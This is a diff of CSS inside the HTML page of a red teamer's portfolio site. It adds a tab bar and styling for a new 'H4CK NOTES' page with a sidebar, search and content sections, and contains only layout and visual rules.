@@ -4,8 +4,56 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Rifdhy RM — Cybersecurity Professional & Red Teamer</title>
-<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Syne:wght@400;700;800&family=Exo+2:wght@300;400;600&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Syne:wght@400;700;800&family=Exo+2:wght@300;400;600&family=JetBrains+Mono:wght@300;400;500;700&family=Orbitron:wght@400;700;900&family=Space+Grotesk:wght@300;400;600;700&display=swap" rel="stylesheet">
 <style>
+/* ══════════════════════ GLOBAL PAGE SWITCHER ══════════════════════ */
+.page { display: none; }
+.page.active { display: block; }
+
+/* ══════════════════════ TAB NAV BAR ══════════════════════ */
+#tab-nav {
+  position: fixed; top: 0; left: 0; right: 0; z-index: 9999;
+  height: 44px;
+  background: rgba(4,8,15,0.98);
+  border-bottom: 1px solid #0d2035;
+  display: flex; align-items: center;
+  padding: 0 20px; gap: 4px;
+  backdrop-filter: blur(20px);
+}
+.tab-btn {
+  font-family: 'Share Tech Mono', monospace;
+  font-size: 10px; letter-spacing: 2px; text-transform: uppercase;
+  padding: 6px 18px;
+  background: transparent;
+  border: 1px solid transparent;
+  color: #3b6177;
+  cursor: pointer;
+  transition: all 0.2s;
+  clip-path: polygon(6px 0%,100% 0%,calc(100% - 6px) 100%,0% 100%);
+}
+.tab-btn:hover { color: #00e5ff; border-color: rgba(0,229,255,0.3); }
+.tab-btn.active { color: #00e5ff; border-color: rgba(0,229,255,0.5); background: rgba(0,229,255,0.07); }
+.tab-btn.notes-tab { color: #7c3aff; }
+.tab-btn.notes-tab:hover, .tab-btn.notes-tab.active { color: #a855f7; border-color: rgba(124,58,255,0.5); background: rgba(124,58,255,0.07); }
+.tab-logo {
+  font-family: 'Syne', sans-serif; font-size: 14px; font-weight: 800;
+  color: #eaf3fc; margin-right: 16px; white-space: nowrap;
+}
+.tab-logo em { color: #00e5ff; font-style: normal; }
+.tab-sep { flex: 1; }
+.tab-badge {
+  font-family: 'Share Tech Mono', monospace; font-size: 9px;
+  letter-spacing: 1.5px; padding: 3px 10px;
+  border: 1px solid rgba(124,58,255,0.4); color: #7c3aff;
+  background: rgba(124,58,255,0.08);
+  clip-path: polygon(4px 0%,100% 0%,calc(100% - 4px) 100%,0% 100%);
+}
+
+/* ══════════════════════ PORTFOLIO STYLES ══════════════════════ */
+#page-portfolio {
+  padding-top: 44px;
+}
+
 :root {
   --bg:      #04080f;
   --bg2:     #070d18;
@@ -24,10 +72,9 @@
   --display: 'Syne', sans-serif;
 }
 
-*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-html { scroll-behavior: smooth; }
+#page-portfolio *, #page-portfolio *::before, #page-portfolio *::after { box-sizing: border-box; margin: 0; padding: 0; }
 
-body {
+#page-portfolio {
   background: var(--bg);
   color: var(--text);
   font-family: var(--sans);
@@ -35,6 +82,7 @@ body {
   line-height: 1.75;
   overflow-x: hidden;
   cursor: none;
+  min-height: 100vh;
 }
 
 #cursor {
@@ -45,7 +93,6 @@ body {
   transition: width .2s, height .2s;
   mix-blend-mode: screen;
 }
-
 #cursor-ring {
   position: fixed; width: 36px; height: 36px;
   border: 1px solid rgba(0,229,255,.35); border-radius: 50%;
@@ -59,200 +106,109 @@ body {
   background-image: linear-gradient(rgba(0,229,255,.025) 1px, transparent 1px), linear-gradient(90deg, rgba(0,229,255,.025) 1px, transparent 1px);
   background-size: 50px 50px; pointer-events: none;
 }
-
 .bg-glow { position: fixed; border-radius: 50%; filter: blur(120px); pointer-events: none; z-index: 0; opacity: .12; }
 .bg-glow-1 { background: var(--accent); width: 600px; height: 600px; top: -200px; left: -100px; }
 .bg-glow-2 { background: var(--purple); width: 600px; height: 600px; bottom: -200px; right: -100px; }
 .bg-glow-3 { background: var(--red); width: 300px; height: 300px; top: 40%; left: 30%; opacity: .06; }
 
-body::after {
+#page-portfolio::after {
   content: ''; position: fixed; inset: 0;
   background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,229,255,.008) 2px, rgba(0,229,255,.008) 4px);
   pointer-events: none; z-index: 9999;
 }
 
-/* NAV */
 nav {
-  position: fixed; top: 0; left: 0; right: 0; z-index: 500;
+  position: fixed; top: 44px; left: 0; right: 0; z-index: 500;
   padding: 0 60px; height: 72px;
   display: flex; align-items: center; justify-content: space-between;
   background: rgba(4,8,15,.85); backdrop-filter: blur(20px);
   border-bottom: 1px solid var(--border);
 }
-
 .nav-logo { font-family: var(--display); font-size: 18px; font-weight: 800; color: var(--white); text-decoration: none; }
 .nav-logo em { color: var(--accent); font-style: normal; }
-
 .nav-links { display: flex; list-style: none; gap: 36px; }
 .nav-links a {
   font-family: var(--mono); font-size: 11px; letter-spacing: 2px;
   color: var(--muted); text-decoration: none; text-transform: uppercase;
   transition: color .25s; position: relative;
 }
-.nav-links a::after {
-  content: ''; position: absolute; bottom: -4px; left: 0;
-  width: 0; height: 1px; background: var(--accent); transition: width .3s;
-}
+.nav-links a::after { content: ''; position: absolute; bottom: -4px; left: 0; width: 0; height: 1px; background: var(--accent); transition: width .3s; }
 .nav-links a:hover { color: var(--accent); }
 .nav-links a:hover::after { width: 100%; }
-
+.nav-notes-link {
+  font-family: var(--mono); font-size: 11px; letter-spacing: 2px;
+  color: #7c3aff; text-decoration: none; text-transform: uppercase;
+  transition: color .25s; cursor: pointer; border: none; background: none;
+  padding: 4px 12px; border: 1px solid rgba(124,58,255,0.3);
+  clip-path: polygon(4px 0%,100% 0%,calc(100% - 4px) 100%,0% 100%);
+  transition: all 0.2s;
+}
+.nav-notes-link:hover { background: rgba(124,58,255,0.1); color: #a855f7; }
 .nav-status { display: flex; align-items: center; gap: 8px; font-family: var(--mono); font-size: 10px; color: var(--muted); }
 .status-dot { width: 7px; height: 7px; background: #22c55e; border-radius: 50%; animation: pulse-dot 2s ease infinite; }
+@keyframes pulse-dot { 0%,100% { box-shadow: 0 0 0 0 rgba(34,197,94,.4); } 50% { box-shadow: 0 0 0 6px rgba(34,197,94,0); } }
 
-@keyframes pulse-dot {
-  0%,100% { box-shadow: 0 0 0 0 rgba(34,197,94,.4); }
-  50% { box-shadow: 0 0 0 6px rgba(34,197,94,0); }
-}
-
-/* HERO */
 #hero {
   position: relative; z-index: 1; min-height: 100vh;
-  display: flex; align-items: center; padding: 72px 60px 0;
+  display: flex; align-items: center; padding: 116px 60px 0;
 }
-
-.hero-inner {
-  width: 100%; max-width: 1200px; margin: 0 auto;
-  display: grid; grid-template-columns: 1fr 340px; gap: 80px; align-items: center;
-}
-
-.hero-eyebrow {
-  font-family: var(--mono); font-size: 11px; letter-spacing: 4px;
-  color: var(--accent); text-transform: uppercase; margin-bottom: 20px;
-  opacity: 0; animation: fadeUp .7s .1s ease forwards;
-}
+.hero-inner { width: 100%; max-width: 1200px; margin: 0 auto; display: grid; grid-template-columns: 1fr 340px; gap: 80px; align-items: center; }
+.hero-eyebrow { font-family: var(--mono); font-size: 11px; letter-spacing: 4px; color: var(--accent); text-transform: uppercase; margin-bottom: 20px; opacity: 0; animation: fadeUp .7s .1s ease forwards; }
 .hero-eyebrow span { color: var(--muted); }
-
-.hero-name {
-  font-family: var(--display); font-size: clamp(52px, 7vw, 96px);
-  font-weight: 800; line-height: .95; color: var(--white); letter-spacing: -3px;
-  opacity: 0; animation: fadeUp .7s .2s ease forwards;
-}
+.hero-name { font-family: var(--display); font-size: clamp(52px, 7vw, 96px); font-weight: 800; line-height: .95; color: var(--white); letter-spacing: -3px; opacity: 0; animation: fadeUp .7s .2s ease forwards; }
 .hero-name .line2 { color: transparent; -webkit-text-stroke: 1.5px var(--accent); display: block; }
-
-.hero-title {
-  font-family: var(--mono); font-size: 13px; color: var(--gold); letter-spacing: 2px;
-  margin-top: 20px; margin-bottom: 28px;
-  opacity: 0; animation: fadeUp .7s .3s ease forwards;
-}
-
-.hero-bio {
-  font-size: 15px; color: var(--text); max-width: 540px; line-height: 1.8;
-  opacity: 0; animation: fadeUp .7s .35s ease forwards;
-}
-
-.hero-chips {
-  display: flex; flex-wrap: wrap; gap: 10px; margin-top: 24px;
-  opacity: 0; animation: fadeUp .7s .4s ease forwards;
-}
-
-.chip {
-  font-family: var(--mono); font-size: 10px; letter-spacing: 1.5px;
-  padding: 6px 14px; border: 1px solid var(--border2); color: var(--text);
-  text-transform: uppercase; transition: all .25s;
-  clip-path: polygon(6px 0%,100% 0%,calc(100% - 6px) 100%,0% 100%);
-}
+.hero-title { font-family: var(--mono); font-size: 13px; color: var(--gold); letter-spacing: 2px; margin-top: 20px; margin-bottom: 28px; opacity: 0; animation: fadeUp .7s .3s ease forwards; }
+.hero-bio { font-size: 15px; color: var(--text); max-width: 540px; line-height: 1.8; opacity: 0; animation: fadeUp .7s .35s ease forwards; }
+.hero-chips { display: flex; flex-wrap: wrap; gap: 10px; margin-top: 24px; opacity: 0; animation: fadeUp .7s .4s ease forwards; }
+.chip { font-family: var(--mono); font-size: 10px; letter-spacing: 1.5px; padding: 6px 14px; border: 1px solid var(--border2); color: var(--text); text-transform: uppercase; transition: all .25s; clip-path: polygon(6px 0%,100% 0%,calc(100% - 6px) 100%,0% 100%); }
 .chip:hover { border-color: var(--accent); color: var(--accent); background: rgba(0,229,255,.05); }
 .chip.a { border-color: rgba(0,229,255,.3); color: var(--accent); }
 .chip.r { border-color: rgba(255,45,85,.3); color: var(--red); }
 .chip.g { border-color: rgba(34,197,94,.3); color: #22c55e; }
-
-.hero-cta {
-  display: flex; gap: 14px; margin-top: 36px;
-  opacity: 0; animation: fadeUp .7s .45s ease forwards;
-}
-
-.btn-primary {
-  font-family: var(--mono); font-size: 11px; letter-spacing: 2px; text-transform: uppercase;
-  padding: 14px 32px; background: var(--accent); color: var(--bg);
-  border: none; text-decoration: none; cursor: pointer; font-weight: 600;
-  transition: all .25s; clip-path: polygon(8px 0%,100% 0%,calc(100% - 8px) 100%,0% 100%);
-}
+.chip.p { border-color: rgba(124,58,255,.4); color: #a855f7; cursor: pointer; }
+.chip.p:hover { background: rgba(124,58,255,0.1); }
+.hero-cta { display: flex; gap: 14px; margin-top: 36px; opacity: 0; animation: fadeUp .7s .45s ease forwards; }
+.btn-primary { font-family: var(--mono); font-size: 11px; letter-spacing: 2px; text-transform: uppercase; padding: 14px 32px; background: var(--accent); color: var(--bg); border: none; text-decoration: none; cursor: pointer; font-weight: 600; transition: all .25s; clip-path: polygon(8px 0%,100% 0%,calc(100% - 8px) 100%,0% 100%); }
 .btn-primary:hover { background: var(--white); transform: translateY(-2px); }
-
-.btn-outline {
-  font-family: var(--mono); font-size: 11px; letter-spacing: 2px; text-transform: uppercase;
-  padding: 14px 32px; background: transparent; color: var(--text);
-  border: 1px solid var(--border2); text-decoration: none; cursor: pointer;
-  transition: all .25s; clip-path: polygon(8px 0%,100% 0%,calc(100% - 8px) 100%,0% 100%);
-}
+.btn-outline { font-family: var(--mono); font-size: 11px; letter-spacing: 2px; text-transform: uppercase; padding: 14px 32px; background: transparent; color: var(--text); border: 1px solid var(--border2); text-decoration: none; cursor: pointer; transition: all .25s; clip-path: polygon(8px 0%,100% 0%,calc(100% - 8px) 100%,0% 100%); }
 .btn-outline:hover { border-color: var(--accent); color: var(--accent); transform: translateY(-2px); }
+.btn-notes { font-family: var(--mono); font-size: 11px; letter-spacing: 2px; text-transform: uppercase; padding: 14px 32px; background: rgba(124,58,255,0.1); color: #7c3aff; border: 1px solid rgba(124,58,255,0.4); text-decoration: none; cursor: pointer; transition: all .25s; clip-path: polygon(8px 0%,100% 0%,calc(100% - 8px) 100%,0% 100%); }
+.btn-notes:hover { background: rgba(124,58,255,0.2); color: #a855f7; transform: translateY(-2px); }
 
-/* Photo card */
 .hero-photo-card { position: relative; opacity: 0; animation: fadeUp .7s .3s ease forwards; }
-
-.photo-frame {
-  position: relative; width: 100%; aspect-ratio: 3/4;
-  background: var(--panel); border: 1px solid var(--border2); overflow: hidden;
-}
-.photo-frame img {
-  width: 100%; height: 100%; object-fit: cover; object-position: top;
-  filter: saturate(.85) contrast(1.05); display: block; transition: transform .5s;
-}
+.photo-frame { position: relative; width: 100%; aspect-ratio: 3/4; background: var(--panel); border: 1px solid var(--border2); overflow: hidden; }
+.photo-frame img { width: 100%; height: 100%; object-fit: cover; object-position: top; filter: saturate(.85) contrast(1.05); display: block; transition: transform .5s; }
 .photo-frame:hover img { transform: scale(1.03); }
-.photo-frame::before {
-  content: ''; position: absolute; inset: 0;
-  background: linear-gradient(to bottom, transparent 50%, rgba(4,8,15,.8) 100%); z-index: 1;
-}
-
+.photo-frame::before { content: ''; position: absolute; inset: 0; background: linear-gradient(to bottom, transparent 50%, rgba(4,8,15,.8) 100%); z-index: 1; }
 .photo-corner { position: absolute; width: 20px; height: 20px; z-index: 2; }
 .photo-corner.tl { top: 12px; left: 12px; border-top: 2px solid var(--accent); border-left: 2px solid var(--accent); }
 .photo-corner.tr { top: 12px; right: 12px; border-top: 2px solid var(--accent); border-right: 2px solid var(--accent); }
 .photo-corner.bl { bottom: 12px; left: 12px; border-bottom: 2px solid var(--accent); border-left: 2px solid var(--accent); }
 .photo-corner.br { bottom: 12px; right: 12px; border-bottom: 2px solid var(--accent); border-right: 2px solid var(--accent); }
-
 .photo-label { position: absolute; bottom: 0; left: 0; right: 0; padding: 20px 18px 16px; z-index: 3; }
 .photo-label-name { font-family: var(--display); font-size: 18px; font-weight: 800; color: var(--white); }
 .photo-label-role { font-family: var(--mono); font-size: 10px; color: var(--accent); letter-spacing: 2px; margin-top: 2px; }
-
-.photo-badge {
-  position: absolute; top: -14px; right: -14px;
-  background: var(--red); font-family: var(--mono); font-size: 9px;
-  letter-spacing: 1px; color: #fff; padding: 8px 14px; z-index: 4;
-  clip-path: polygon(6px 0%,100% 0%,calc(100% - 6px) 100%,0% 100%);
-}
-
+.photo-badge { position: absolute; top: -14px; right: -14px; background: var(--red); font-family: var(--mono); font-size: 9px; letter-spacing: 1px; color: #fff; padding: 8px 14px; z-index: 4; clip-path: polygon(6px 0%,100% 0%,calc(100% - 6px) 100%,0% 100%); }
 .hero-stats { display: flex; margin-top: 10px; border: 1px solid var(--border); }
 .hstat { flex: 1; padding: 14px 10px; text-align: center; border-right: 1px solid var(--border); }
 .hstat:last-child { border-right: none; }
 .hstat-num { font-family: var(--display); font-size: 22px; font-weight: 800; color: var(--accent); line-height: 1; }
 .hstat-label { font-family: var(--mono); font-size: 8px; letter-spacing: 1.5px; color: var(--muted); text-transform: uppercase; margin-top: 3px; }
 
-.scroll-hint {
-  position: absolute; bottom: 32px; left: 50%; transform: translateX(-50%);
-  display: flex; flex-direction: column; align-items: center; gap: 8px;
-  opacity: 0; animation: fadeUp .7s .8s ease forwards;
-}
-.scroll-line {
-  width: 1px; height: 50px;
-  background: linear-gradient(to bottom, var(--accent), transparent);
-  animation: scroll-anim 1.8s ease infinite;
-}
-@keyframes scroll-anim {
-  0% { transform: scaleY(0); transform-origin: top; }
-  50% { transform: scaleY(1); transform-origin: top; }
-  51% { transform: scaleY(1); transform-origin: bottom; }
-  100% { transform: scaleY(0); transform-origin: bottom; }
-}
+.scroll-hint { position: absolute; bottom: 32px; left: 50%; transform: translateX(-50%); display: flex; flex-direction: column; align-items: center; gap: 8px; opacity: 0; animation: fadeUp .7s .8s ease forwards; }
+.scroll-line { width: 1px; height: 50px; background: linear-gradient(to bottom, var(--accent), transparent); animation: scroll-anim 1.8s ease infinite; }
+@keyframes scroll-anim { 0%{transform:scaleY(0);transform-origin:top}50%{transform:scaleY(1);transform-origin:top}51%{transform:scaleY(1);transform-origin:bottom}100%{transform:scaleY(0);transform-origin:bottom} }
 .scroll-text { font-family: var(--mono); font-size: 9px; letter-spacing: 3px; color: var(--muted); text-transform: uppercase; writing-mode: vertical-lr; }
 
-/* SECTIONS */
 .section { position: relative; z-index: 1; padding: 110px 60px; max-width: 1200px; margin: 0 auto; }
 .sec-label { font-family: var(--mono); font-size: 10px; letter-spacing: 4px; color: var(--accent); text-transform: uppercase; margin-bottom: 10px; }
 .sec-label::before { content: '// '; color: var(--muted); }
 .sec-title { font-family: var(--display); font-size: clamp(32px,4vw,54px); font-weight: 800; color: var(--white); line-height: 1; margin-bottom: 56px; }
 .divider { border: none; border-top: 1px solid var(--border); margin: 0; }
 
-/* EXPERTISE */
 .exp-grid { display: grid; grid-template-columns: repeat(3,1fr); gap: 2px; }
-.exp-card {
-  background: var(--panel); border: 1px solid var(--border); padding: 32px 28px;
-  position: relative; overflow: hidden; transition: transform .3s, border-color .3s;
-}
-.exp-card::before {
-  content: ''; position: absolute; top: 0; left: 0; right: 0; height: 2px;
-  background: linear-gradient(90deg, var(--accent), transparent);
-  transform: scaleX(0); transform-origin: left; transition: transform .4s;
-}
+.exp-card { background: var(--panel); border: 1px solid var(--border); padding: 32px 28px; position: relative; overflow: hidden; transition: transform .3s, border-color .3s; }
+.exp-card::before { content: ''; position: absolute; top: 0; left: 0; right: 0; height: 2px; background: linear-gradient(90deg, var(--accent), transparent); transform: scaleX(0); transform-origin: left; transition: transform .4s; }
 .exp-card:hover::before { transform: scaleX(1); }
 .exp-card:hover { transform: translateY(-5px); border-color: var(--border2); }
 .exp-num { font-family: var(--mono); font-size: 11px; color: var(--muted); letter-spacing: 2px; margin-bottom: 20px; }
@@ -260,7 +216,6 @@ nav {
 .exp-title { font-family: var(--display); font-size: 17px; font-weight: 700; color: var(--white); margin-bottom: 12px; line-height: 1.3; }
 .exp-desc { font-size: 13px; color: var(--muted); line-height: 1.7; }
 
-/* SKILLS */
 .skills-wrapper { display: grid; grid-template-columns: repeat(2,1fr); gap: 40px; }
 .sg-title { font-family: var(--mono); font-size: 10px; letter-spacing: 3px; text-transform: uppercase; color: var(--red); margin-bottom: 16px; padding-bottom: 10px; border-bottom: 1px solid var(--border); }
 .skill-bars { display: flex; flex-direction: column; gap: 12px; }
@@ -273,21 +228,12 @@ nav {
 .skill-fill.purple { background: linear-gradient(90deg, var(--purple), var(--accent)); }
 .skill-fill.gold { background: linear-gradient(90deg, var(--gold), var(--red)); }
 .skill-fill.visible { transform: scaleX(1); }
-
 .tags-row { display: flex; flex-wrap: wrap; gap: 8px; }
-.stag {
-  font-family: var(--mono); font-size: 10px; padding: 5px 14px;
-  border: 1px solid var(--border); color: var(--muted); letter-spacing: 1px;
-  transition: all .25s; clip-path: polygon(5px 0%,100% 0%,calc(100% - 5px) 100%,0% 100%);
-}
+.stag { font-family: var(--mono); font-size: 10px; padding: 5px 14px; border: 1px solid var(--border); color: var(--muted); letter-spacing: 1px; transition: all .25s; clip-path: polygon(5px 0%,100% 0%,calc(100% - 5px) 100%,0% 100%); }
 .stag:hover { border-color: var(--accent); color: var(--accent); background: rgba(0,229,255,.04); }
 
-/* EXPERIENCE */
 .tl-wrapper { display: grid; grid-template-columns: 1fr 1fr; gap: 0 80px; position: relative; }
-.tl-wrapper::before {
-  content: ''; position: absolute; left: 50%; top: 0; bottom: 0; width: 1px;
-  background: linear-gradient(to bottom, var(--accent), transparent 80%); transform: translateX(-50%);
-}
+.tl-wrapper::before { content: ''; position: absolute; left: 50%; top: 0; bottom: 0; width: 1px; background: linear-gradient(to bottom, var(--accent), transparent 80%); transform: translateX(-50%); }
 .tl-col-right { padding-top: 60px; }
 .tl-item { position: relative; padding-bottom: 40px; }
 .tl-dot { width: 10px; height: 10px; background: var(--accent); box-shadow: 0 0 12px var(--accent); clip-path: polygon(50% 0%,100% 50%,50% 100%,0% 50%); margin-bottom: 12px; }
@@ -296,20 +242,14 @@ nav {
 .tl-company { font-family: var(--mono); font-size: 11px; color: var(--accent); letter-spacing: 1px; margin-bottom: 10px; }
 .tl-desc { font-size: 13px; color: var(--muted); line-height: 1.7; }
 
-/* CERTS */
 .cert-grid { display: grid; grid-template-columns: repeat(3,1fr); gap: 12px; }
-.cert-card {
-  background: var(--panel); border: 1px solid var(--border); padding: 22px;
-  position: relative; overflow: hidden; transition: all .3s;
-  clip-path: polygon(10px 0%,100% 0%,calc(100% - 10px) 100%,0% 100%);
-}
+.cert-card { background: var(--panel); border: 1px solid var(--border); padding: 22px; position: relative; overflow: hidden; transition: all .3s; clip-path: polygon(10px 0%,100% 0%,calc(100% - 10px) 100%,0% 100%); }
 .cert-card:hover { border-color: var(--gold); transform: translateY(-3px); }
 .cert-status { font-family: var(--mono); font-size: 9px; letter-spacing: 2px; color: var(--gold); margin-bottom: 8px; text-transform: uppercase; }
 .cert-status.active { color: #22c55e; }
 .cert-status.progress { color: var(--purple); }
 .cert-name { font-size: 13px; color: var(--white); font-weight: 600; line-height: 1.4; }
 
-/* EDUCATION */
 .edu-grid { display: grid; grid-template-columns: repeat(3,1fr); gap: 16px; }
 .edu-card { background: var(--panel); border: 1px solid var(--border); padding: 28px 24px; transition: all .3s; position: relative; overflow: hidden; }
 .edu-card:hover { border-color: var(--purple); transform: translateY(-3px); }
@@ -318,7 +258,6 @@ nav {
 .edu-degree { font-family: var(--display); font-size: 15px; font-weight: 700; color: var(--white); margin-bottom: 6px; line-height: 1.4; }
 .edu-school { font-family: var(--mono); font-size: 11px; color: var(--muted); letter-spacing: 1px; }
 
-/* CONTACT */
 .contact-wrapper { max-width: 680px; margin: 0 auto; text-align: center; }
 .contact-sub { font-size: 16px; color: var(--muted); margin-bottom: 52px; line-height: 1.8; }
 .contact-grid { display: grid; grid-template-columns: repeat(2,1fr); gap: 12px; text-align: left; margin-bottom: 40px; }
@@ -329,12 +268,7 @@ nav {
 .ci-value { font-family: var(--mono); font-size: 12px; color: var(--text); }
 .contact-item:hover .ci-value { color: var(--accent); }
 
-/* FOOTER */
-footer {
-  position: relative; z-index: 1;
-  background: var(--bg2); border-top: 1px solid var(--border);
-  padding: 28px 60px; display: flex; justify-content: space-between; align-items: center;
-}
+footer { position: relative; z-index: 1; background: var(--bg2); border-top: 1px solid var(--border); padding: 28px 60px; display: flex; justify-content: space-between; align-items: center; }
 .footer-brand { font-family: var(--display); font-size: 14px; font-weight: 700; color: var(--muted); }
 .footer-brand em { color: var(--accent); font-style: normal; }
 .footer-copy { font-family: var(--mono); font-size: 10px; color: var(--muted); letter-spacing: 1px; }
@@ -342,7 +276,6 @@ footer {
 .footer-links a { font-family: var(--mono); font-size: 10px; color: var(--muted); text-decoration: none; letter-spacing: 1px; transition: color .2s; }
 .footer-links a:hover { color: var(--accent); }
 
-/* ANIMATIONS */
 @keyframes fadeUp { from { opacity: 0; transform: translateY(28px); } to { opacity: 1; transform: translateY(0); } }
 .reveal { opacity: 0; transform: translateY(32px); transition: opacity .7s ease, transform .7s ease; }
 .reveal.visible { opacity: 1; transform: none; }
@@ -373,11 +306,258 @@ footer {
 @media (max-width: 600px) {
   .exp-grid, .cert-grid, .edu-grid, .skills-wrapper, .contact-grid { grid-template-columns: 1fr; }
   #cursor, #cursor-ring { display: none; }
-  body { cursor: auto; }
 }
+
+/* ══════════════════════ H4CK NOTES STYLES ══════════════════════ */
+#page-notes {
+  display: none;
+  background: #060810;
+  color: #b8c8e8;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 13px;
+  line-height: 1.75;
+  min-height: 100vh;
+  padding-top: 44px;
+}
+#page-notes.active { display: flex; }
+
+#page-notes ::-webkit-scrollbar { width: 4px; height: 4px; }
+#page-notes ::-webkit-scrollbar-track { background: #090c14; }
+#page-notes ::-webkit-scrollbar-thumb { background: #202a50; border-radius: 2px; }
+#page-notes ::-webkit-scrollbar-thumb:hover { background: #7c3aff; }
+
+/* Notes grid background */
+#page-notes::before {
+  content:''; position:fixed; inset:44px 0 0 0;
+  background-image: linear-gradient(rgba(124,58,255,0.03) 1px,transparent 1px), linear-gradient(90deg,rgba(124,58,255,0.03) 1px,transparent 1px);
+  background-size:40px 40px; pointer-events:none; z-index:0;
+}
+
+/* NOTES SIDEBAR */
+#n-sidebar {
+  width: 290px; min-height: calc(100vh - 44px);
+  background: #090c14; border-right: 1px solid #1a2240;
+  position: fixed; top: 44px; left: 0; bottom: 0;
+  display: flex; flex-direction: column; z-index: 100; overflow-y: auto;
+  box-shadow: 4px 0 30px rgba(0,0,0,0.5);
+}
+.n-sidebar-header { padding:20px 18px 14px; border-bottom:1px solid #1a2240; background:linear-gradient(135deg,#0d1020,#120d20); position:relative; overflow:hidden; }
+.n-sidebar-header::before { content:''; position:absolute; top:-30px; right:-30px; width:100px; height:100px; background:radial-gradient(circle,rgba(124,58,255,0.35) 0%,transparent 70%); }
+.n-logo-skull { font-size:22px; display:inline-block; filter:drop-shadow(0 0 8px #7c3aff); animation:n-float 3s ease-in-out infinite; }
+@keyframes n-float { 0%,100%{transform:translateY(0)} 50%{transform:translateY(-3px)} }
+.n-logo-text { font-family:'Orbitron',monospace; font-weight:900; font-size:14px; color:#e8f0ff; letter-spacing:1px; line-height:1.3; margin-top:6px; }
+.n-logo-text .nd { color:#7c3aff; text-shadow:0 0 15px rgba(124,58,255,0.35); }
+.n-logo-text .ns { color:#00e5ff; text-shadow:0 0 15px rgba(0,229,255,0.25); }
+.n-logo-text .nh { color:#ff3a6e; text-shadow:0 0 15px rgba(255,58,110,0.4); }
+.n-logo-tagline { font-size:9px; color:#445070; letter-spacing:3px; text-transform:uppercase; margin-top:4px; display:flex; align-items:center; gap:6px; }
+.n-status-dot { width:6px; height:6px; background:#39ff14; border-radius:50%; animation:n-pulse 1.5s ease-in-out infinite; display:inline-block; box-shadow:0 0 8px #39ff14; }
+@keyframes n-pulse { 0%,100%{opacity:1;transform:scale(1)} 50%{opacity:0.5;transform:scale(0.8)} }
+.n-search-wrap { padding:10px 14px; border-bottom:1px solid #1a2240; }
+.n-search-inner { position:relative; }
+.n-search-inner input { width:100%; background:#0d1120; border:1px solid #1a2240; border-radius:6px; padding:8px 32px 8px 12px; color:#b8c8e8; font-family:'JetBrains Mono',monospace; font-size:11px; outline:none; transition:border-color 0.2s,box-shadow 0.2s; }
+.n-search-inner input:focus { border-color:#7c3aff; box-shadow:0 0 0 2px rgba(124,58,255,0.35); }
+.n-search-inner input::placeholder { color:#445070; }
+.n-nav { flex:1; padding:6px 0 10px; }
+.n-nav-section { margin-bottom:2px; }
+.n-nav-section-label { padding:10px 14px 4px; font-size:9px; letter-spacing:3px; text-transform:uppercase; color:#445070; display:flex; align-items:center; gap:6px; }
+.n-nav-section-label::after { content:''; flex:1; height:1px; background:#1a2240; }
+.n-nav-item { display:flex; align-items:center; gap:6px; padding:5px 14px 5px 20px; color:#445070; font-size:11px; cursor:pointer; border-left:2px solid transparent; transition:all 0.15s; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; user-select:none; border-radius:0 4px 4px 0; margin-right:8px; }
+.n-nav-item:hover { color:#b8c8e8; background:rgba(255,255,255,0.03); }
+.n-nav-item.active { color:#00e5ff; border-left-color:#7c3aff; background:linear-gradient(90deg,rgba(124,58,255,0.12) 0%,transparent 100%); }
+.n-nav-badge { margin-left:auto; font-size:8px; padding:1px 5px; border-radius:10px; background:rgba(124,58,255,0.2); color:#7c3aff; border:1px solid rgba(124,58,255,0.3); flex-shrink:0; }
+.n-nav-badge.new { background:rgba(255,58,110,0.2); color:#ff3a6e; border-color:rgba(255,58,110,0.3); }
+.n-sidebar-footer { padding:12px 14px; border-top:1px solid #1a2240; }
+.n-prog-row { display:flex; justify-content:space-between; font-size:9px; color:#445070; text-transform:uppercase; letter-spacing:1.5px; margin-bottom:6px; }
+#n-prog-pct { color:#7c3aff; font-weight:700; }
+.n-progress-bar { height:3px; background:#1a2240; border-radius:3px; overflow:hidden; }
+.n-progress-fill { height:100%; background:linear-gradient(90deg,#7c3aff,#00e5ff); border-radius:3px; width:0%; transition:width 0.5s ease; box-shadow:0 0 8px rgba(124,58,255,0.35); }
+.n-sidebar-credits { margin-top:8px; font-size:9px; color:#445070; text-align:center; letter-spacing:1px; }
+
+/* NOTES MAIN */
+#n-main { margin-left: 290px; flex:1; min-height:calc(100vh - 44px); position:relative; z-index:1; }
+.n-topbar { position:sticky; top:44px; background:rgba(6,8,16,0.88); backdrop-filter:blur(16px); border-bottom:1px solid #1a2240; padding:10px 28px; display:flex; align-items:center; justify-content:space-between; z-index:50; }
+.n-breadcrumb { font-size:11px; color:#445070; display:flex; align-items:center; gap:6px; }
+.n-breadcrumb .sep { color:#202a50; }
+.n-breadcrumb span { color:#b8c8e8; }
+.n-topbar-right { display:flex; gap:8px; align-items:center; }
+.n-tbadge { font-size:9px; letter-spacing:1.5px; text-transform:uppercase; padding:4px 10px; border-radius:4px; border:1px solid; cursor:pointer; transition:all 0.2s; }
+.n-tbadge.purple { color:#7c3aff; border-color:rgba(124,58,255,0.3); background:rgba(124,58,255,0.1); }
+.n-tbadge.purple:hover { background:rgba(124,58,255,0.2); box-shadow:0 0 12px rgba(124,58,255,0.35); }
+.n-tbadge.cyan { color:#00e5ff; border-color:rgba(0,229,255,0.3); background:rgba(0,229,255,0.1); }
+.n-tbadge.red { color:#ff3a6e; border-color:rgba(255,58,110,0.3); background:rgba(255,58,110,0.1); }
+#n-content { padding:28px 32px; max-width:1150px; }
+
+/* Notes sections */
+.n-section { display:none; animation:n-fadeUp 0.3s ease; }
+.n-section.active { display:block; }
+@keyframes n-fadeUp { from{opacity:0;transform:translateY(10px)} to{opacity:1;transform:translateY(0)} }
+
+.n-page-title { font-family:'Orbitron',monospace; font-size:24px; font-weight:900; color:#e8f0ff; margin-bottom:4px; line-height:1.2; letter-spacing:-0.5px; }
+.n-page-title .hl { color:#7c3aff; text-shadow:0 0 20px rgba(124,58,255,0.35); }
+.n-page-title .hl2 { color:#00e5ff; text-shadow:0 0 20px rgba(0,229,255,0.25); }
